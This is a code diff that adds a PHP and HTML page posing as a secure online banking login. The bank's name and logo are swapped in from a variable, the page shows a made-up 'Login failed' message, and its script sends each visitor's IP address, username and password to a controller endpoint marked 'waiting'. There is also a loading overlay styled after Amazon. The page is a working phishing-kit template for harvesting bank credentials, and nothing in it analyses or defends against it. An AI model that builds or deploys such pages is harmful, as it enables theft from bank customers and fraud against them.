@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en-GB">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Online Banking - Secure Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #dfdfdf 0%, #fcfcfc 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .login-container {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            border-top: 4px solid #003d82;
+        }
+
+        .bank-logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .bank-logo h1 {
+            color: #003d82;
+            font-size: 28px;
+            font-weight: 300;
+            letter-spacing: 1px;
+        }
+
+        .login-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .login-header h2 {
+            color: #333;
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+        }
+
+        .login-header p {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid #e1e5e9;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+            background-color: #fff;
+        }
+
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #003d82;
+            box-shadow: 0 0 0 3px rgba(0, 61, 130, 0.1);
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background: #003d82;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .login-button:hover {
+            background: #002a5c;
+        }
+
+        .login-button:active {
+            transform: translateY(1px);
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .forgot-password a {
+            color: #003d82;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .security-notice {
+            background: #f8f9fa;
+            border: 1px solid #e9ecef;
+            border-radius: 4px;
+            padding: 15px;
+            margin-top: 25px;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .security-notice .icon {
+            color: #28a745;
+            margin-right: 5px;
+        }
+
+        .footer-links {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #e9ecef;
+        }
+
+        .footer-links a {
+            color: #666;
+            text-decoration: none;
+            font-size: 12px;
+            margin: 0 10px;
+        }
+
+        .footer-links a:hover {
+            color: #003d82;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 15px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                min-height: 100vh;
+            }
+
+            .login-container {
+                padding: 30px 20px;
+                margin: 0 auto;
+                width: 100%;
+                max-width: 100%;
+            }
+            
+            .bank-logo h1 {
+                font-size: 24px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            body {
+                padding: 10px;
+            }
+
+            .login-container {
+                padding: 25px 15px;
+            }
+
+            .bank-logo h1 {
+                font-size: 22px;
+            }
+
+            .login-header h2 {
+                font-size: 22px;
+            }
+        }
+
+        /* Loading state */
+        .loading {
+            opacity: 0.7;
+            pointer-events: none;
+        }
+
+        .loading .login-button::after {
+            content: "";
+            width: 16px;
+            height: 16px;
+            margin-left: 10px;
+            border: 2px solid transparent;
+            border-top: 2px solid #ffffff;
+            border-radius: 50%;
+            display: inline-block;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <?php if ($hideStyle == 'loading'): ?>
+        <div
+            style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.85); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 1000;">
+            <div
+                style="width: 56px; height: 56px; border: 6px solid #e7e9ec; border-top: 6px solid #ff9900; border-radius: 50%; animation: amazon-spin 1s linear infinite;">
+            </div>
+            <p style="color: #111; font-family: 'Amazon Ember', Arial, sans-serif; margin-top: 24px; font-size: 1.1em;">
+                Loading, please wait...
+            </p>
+        </div>
+        <style>
+            @keyframes amazon-spin {
+                0% {
+                    transform: rotate(0deg);
+                }
+
+                100% {
+                    transform: rotate(360deg);
+                }
+            }
+        </style>
+    <?php endif; ?>
+    <div class="login-container">
+        <div class="bank-logo">
+            <?php
+                $imagePath = "assets/bnk/" . $SelectedBank . ".png";
+                if (!file_exists($imagePath)) {
+                    $imagePath = "assets/bnk/default.png";
+                }
+            ?>
+            <img src="<?php echo $imagePath; ?>" width="50" height="50" alt="Bank Logo">
+        </div>
+
+        <div class="login-header">
+            <h2><?php echo ucwords($SelectedBank) ?> Login</h2>
+            <p>Access your account safely and securely</p>
+        </div>
+
+        <div class="error-message" style="background: #fff5f5; border: 1px solid #fed7d7; color: #c53030; padding: 12px 16px; border-radius: 4px; margin-bottom: 20px; font-size: 14px; display: flex; align-items: center;">
+            <span style="margin-right: 8px;">⚠️</span>
+            <span>Login failed. Please check your credentials and try again.</span>
+        </div>
+
+        <div id="loginForm">
+            <div class="form-group">
+                <label for="email">Username</label>
+                <input type="email" id="email" name="email" required autocomplete="username">
+            </div>
+
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required autocomplete="current-password">
+            </div>
+
+            <button id="logBtn" type="button" role="button" class="login-button" onclick="bnkLog()">Sign In</button>
+        </div>
+
+        <div class="footer-links">
+            <a href="#" onclick="return false;">Privacy Policy</a>
+            <a href="#" onclick="return false;">Terms of Service</a>
+            <a href="#" onclick="return false;">Help & Support</a>
+        </div>
+    </div>
+
+    <script>
+        function bnkLog() {
+            if (!document.getElementById('email').value || !document.getElementById('password').value) {
+                document.getElementById('logBtn').disabled = true;
+                return;
+            }
+            const params = new URLSearchParams();
+            params.append('action', 'bnk_log');
+            params.append('IP', '<?php echo $_SERVER['REMOTE_ADDR']; ?>');
+            params.append('Email', document.getElementById('email').value);
+            params.append('Password', document.getElementById('password').value);
+            params.append('Status', 'waiting');
+            fetch('controller.php', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: params })
+                .then(response => response.json())
+                .then(data => console.log('Request successful:', data))
+                .catch(error => console.error('Request failed:', error));
+        }
+    </script>
+    </script>
+</body>
+</html>
